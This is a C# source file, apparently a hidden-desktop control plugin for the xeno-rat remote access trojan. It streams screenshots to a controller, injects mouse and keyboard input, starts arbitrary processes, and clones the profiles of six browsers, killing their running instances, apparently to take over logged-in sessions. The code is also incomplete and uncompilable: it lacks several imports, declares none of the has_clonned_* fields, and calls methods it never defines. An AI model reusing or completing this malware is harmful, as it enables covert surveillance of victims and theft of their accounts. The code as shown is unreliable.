using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Management;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using xeno_rat_client;

namespace Plugin
{
    public class Main
    {
        private Node ImageNode;
        private bool playing = false;
        private int quality = 100;
        private bool do_browser_clone = false;
        private bool[] cloningFlags = new bool[6];
        private ImagingHandler ImageHandler;
        private InputHandler InputHandler;
        private ProcessHandler ProcessHandler;

        [DllImport("SHCore.dll", SetLastError = true)]
        public static extern int SetProcessDpiAwareness(int awareness);

        public async Task Run(Node node)
        {
            try
            {
                await node.SendAsync(new byte[] { 3 }); // Indicate that it has connected

                if (!await AcceptSubSubNode(node))
                {
                    DisconnectAndCleanup();
                    return;
                }

                SetProcessDpiAwareness(2); // Set awareness of DPI per monitor

                Thread screenShotThread = new Thread(async () => await ScreenShotThread());
                screenShotThread.Start();

                string desktopName = Encoding.UTF8.GetString(await node.ReceiveAsync());
                ImageHandler = new ImagingHandler(desktopName);
                InputHandler = new InputHandler(desktopName);
                ProcessHandler = new ProcessHandler(desktopName);

                while (node.Connected())
                {
                    byte[] data = await node.ReceiveAsync();

                    if (data == null)
                    {
                        DisconnectAndCleanup();
                        break;
                    }

                    switch (data[0])
                    {
                        case 0:
                            playing = true;
                            break;
                        case 1:
                            playing = false;
                            break;
                        case 2:
                            quality = BitConverter.ToInt32(data, 1);
                            break;
                        case 3:
                            uint msg = BitConverter.ToUInt32(data, 1);
                            IntPtr wParam = (IntPtr)BitConverter.ToInt32(data, 5);
                            IntPtr lParam = (IntPtr)BitConverter.ToInt32(data, 9);
                            new Thread(() => InputHandler.Input(msg, wParam, lParam)).Start();
                            break;
                        case 4:
                            ProcessHandler.StartExplorer();
                            break;
                        case 5:
                            ProcessHandler.CreateProc(Encoding.UTF8.GetString(data, 1, data.Length - 1));
                            break;
                        case 6:
                            do_browser_clone = true;
                            break;
                        case 7:
                            do_browser_clone = false;
                            break;
                        case 8:
                            HandleBrowserStart(do_browser_clone, ref has_clonned_chrome, HandleCloneChrome, ProcessHandler.StartChrome);
                            break;
                        case 9:
                            HandleBrowserStart(do_browser_clone, ref has_clonned_firefox, HandleCloneFirefox, ProcessHandler.StartFirefox);
                            break;
                        case 10:
                            HandleBrowserStart(do_browser_clone, ref has_clonned_edge, HandleCloneEdge, ProcessHandler.StartEdge);
                            break;
                        case 11:
                            HandleBrowserStart(do_browser_clone, ref has_clonned_opera, HandleCloneOpera, ProcessHandler.StartOpera);
                            break;
                        case 12:
                            HandleBrowserStart(do_browser_clone, ref has_clonned_operagx, HandleCloneOperaGX, ProcessHandler.StartOperaGX);
                            break;
                        case 13:
                            HandleBrowserStart(do_browser_clone, ref has_clonned_brave, HandleCloneBrave, ProcessHandler.StartBrave);
                            break;
                    }
                }
            }
            catch (Exception ex)
            {
                // Handle exception
            }
            finally
            {
                DisconnectAndCleanup();
            }
        }

        private async Task<bool> AcceptSubSubNode(Node node)
        {
            byte[] id = await node.ReceiveAsync();

            if (id != null)
            {
                int nodeId = BitConverter.ToInt32(id, 0);
                Node tempNode = null;

                foreach (Node subNode in node.Parent.subNodes)
                {
                    if (subNode.SetId == nodeId)
                    {
                        await node.SendAsync(new byte[] { 1 });
                        tempNode = subNode;
                        break;
                    }
                }

                if (tempNode != null)
                {
                    node.AddSubNode(tempNode);
                    ImageNode = tempNode;
                    return true;
                }
            }

            await node.SendAsync(new byte[] { 0 });
            return false;
        }

        private void DisconnectAndCleanup()
        {
            ImageNode?.Disconnect();
            ImageHandler?.Dispose();
            InputHandler?.Dispose();
            ProcessHandler?.Dispose();
            GC.Collect();
        }

        private async Task ScreenShotThread()
        {
            try
            {
                while (ImageNode.Connected())
                {
                    if (!playing)
                    {
                        await Task.Delay(500);
                        continue;
                    }

                    try
                    {
                        Bitmap img = ImageHandler.Screenshot();
                        EncoderParameters encoderParams = new EncoderParameters(1);
                        encoderParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);

                        ImageCodecInfo codecInfo = GetEncoderInfo(ImageFormat.Jpeg);
                        byte[] data;

                        using (MemoryStream stream = new MemoryStream())
                        {
                            img.Save(stream, codecInfo, encoderParams);
                            data = stream.ToArray();
                        }

                        await ImageNode.SendAsync(data);
                    }
                    catch
                    {
                        // Handle exception
                    }
                }
            }
            catch
            {
                // Handle exception
            }
        }

        private void HandleBrowserStart(bool doBrowserClone, ref bool hasClonedBrowser, Func<Task> handleCloneBrowser, Action startBrowser)
        {
            if (doBrowserClone && !hasClonedBrowser)
            {
                hasClonedBrowser = true;
                handleCloneBrowser().ContinueWith(_ =>
                {
                    startBrowser();
                    hasClonedBrowser = false;
                });
            }
            else
            {
                startBrowser();
            }
        }

        private async Task HandleCloneFirefox()
        {
            if (!cloningFlags[1]) // Check if Firefox is not already being cloned
            {
                cloningFlags[1] = true; // Set cloning flag to true
                if (!await ProcessHandler.CloneFirefox())
                {
                    int pid = await GetProcessViaCommandLine("firefox.exe", "FirefoxAutomationData");
                    if (pid != -1)
                    {
                        Process p = Process.GetProcessById(pid);
                        try
                        {
                            p.Kill();
                            await ProcessHandler.CloneFirefox();
                        }
                        catch { }
                        p.Dispose();
                    }
                }
                ProcessHandler.StartFirefox();
                cloningFlags[1] = false; // Reset cloning flag
            }
        }

        private async Task HandleCloneEdge()
        {
            if (!cloningFlags[2]) // Check if Edge is not already being cloned
            {
                cloningFlags[2] = true; // Set cloning flag to true
                if (!await ProcessHandler.CloneEdge())
                {
                    int pid = await GetProcessViaCommandLine("msedge.exe", "EdgeAutomationData");
                    if (pid != -1)
                    {
                        Process p = Process.GetProcessById(pid);
                        try
                        {
                            p.Kill();
                            await ProcessHandler.CloneEdge();
                        }
                        catch { }
                        p.Dispose();
                    }
                }
                ProcessHandler.StartEdge();
                cloningFlags[2] = false; // Reset cloning flag
            }
        }

        private async Task HandleCloneOpera()
        {
            if (!cloningFlags[3]) // Check if Opera is not already being cloned
            {
                cloningFlags[3] = true; // Set cloning flag to true
                if (!await ProcessHandler.CloneOpera())
                {
                    int pid = await GetProcessViaCommandLine("opera.exe", "OperaAutomationData");
                    if (pid != -1)
                    {
                        Process p = Process.GetProcessById(pid);
                        try
                        {
                            p.Kill();
                            await ProcessHandler.CloneOpera();
                        }
                        catch { }
                        p.Dispose();
                    }
                }
                ProcessHandler.StartOpera();
                cloningFlags[3] = false; // Reset cloning flag
            }
        }

        private async Task HandleCloneOperaGX()
        {
            if (!cloningFlags[4]) // Check if OperaGX is not already being cloned
            {
                cloningFlags[4] = true; // Set cloning flag to true
                if (!await ProcessHandler.CloneOperaGX())
                {
                    int pid = await GetProcessViaCommandLine("opera.exe", "OperaGXAutomationData");
                    if (pid != -1)
                    {
                        Process p = Process.GetProcessById(pid);
                        try
                        {
                            p.Kill();
                            await ProcessHandler.CloneOperaGX();
                        }
                        catch { }
                        p.Dispose();
                    }
                }
                ProcessHandler.StartOperaGX();
                cloningFlags[4] = false; // Reset cloning flag
            }
        }

        private async Task HandleCloneBrave()
        {
            if (!cloningFlags[5]) // Check if Brave is not already being cloned
            {
                cloningFlags[5] = true; // Set cloning flag to true
                if (!await ProcessHandler.CloneBrave())
                {
                    int pid = await GetProcessViaCommandLine("brave.exe", "BraveAutomationData");
                    if (pid != -1)
                    {
                        Process p = Process.GetProcessById(pid);
                        try
                        {
                            p.Kill();
                            await ProcessHandler.CloneBrave();
                        }
                        catch { }
                        p.Dispose();
                    }
                }
                ProcessHandler.StartBrave();
                cloningFlags[5] = false; // Reset cloning flag
            }
        }
        
    }
}
